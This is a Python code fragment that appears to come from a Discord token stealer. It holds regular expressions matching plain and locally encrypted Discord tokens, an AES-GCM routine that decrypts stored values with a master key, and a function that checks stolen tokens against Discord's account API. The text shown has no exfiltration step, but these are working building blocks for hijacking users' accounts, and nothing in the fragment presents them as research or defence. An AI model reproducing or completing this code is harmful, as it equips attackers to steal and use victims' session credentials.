import requests
from Crypto.Cipher import AES

BASE_URL = "https://discord.com/api/v9/users/@me"
TOKEN_REGEXP = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
TOKEN_REGEXP_ENC = r"dQw4w9WgXcQ:[^\"]*"

def validate_token(token: str) -> bool:
    """Validate a Discord token by making an API call."""
    try:
        r = requests.get(BASE_URL, headers={'Authorization': token})
        return r.status_code == 200
    except Exception as e:
        print(f"Error validating token: {e}")
        return False

def decrypt_value(buff: bytes, master_key: bytes) -> str:
    """Decrypt the encrypted value."""
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode()
    except Exception as e:
        print(f"Error decrypting value: {e}")
        return None
